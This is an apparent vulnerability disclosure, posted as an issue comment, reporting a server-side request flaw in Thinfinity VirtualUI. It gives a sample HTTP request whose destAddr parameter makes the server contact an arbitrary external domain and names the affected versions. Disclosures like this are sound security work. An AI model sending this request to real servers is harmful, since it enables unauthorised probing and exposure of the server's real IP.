### **[dnlmrls](/dnlmrls)** commented [Jan 11, 2022](#issue-1099046708)

| Dear Cybele Software,  My name is Daniel Morales.  I have found a vulnerability in Thinfinity VirtualUI that could allow a malicious actor to trigger a server-side request to external endpoints. Summary External service interaction arises when it is possible to induce an application to interact with an arbitrary external service. The ability to send requests to other systems can allow the vulnerable server to filtrate the real IP of the webserver or increase the attack surface (it may be used also to filtrate the real IP behind a CDN) Payload An example of the HTTP request "<https://example.com/cmd>? cmd=connect&wscompression=true&destAddr=domain.com &scraper=fmx&screenWidth=1918&screenHeight=934&fitmode=0&argumentsp=&orientation=0&browserWidth=191 8&browserHeight=872&supportCur=true&id=null&devicePixelRatio=1&isMobile=false&isLandscape=true&supp ortsFullScreen=true&webapp=false" where "**domain.com**" is the external endpoint to be requested. Vulnerable versions It has been tested in VirtualUI version 2.1.28.0, 2.1.32.1 and 2.5.26.2 |
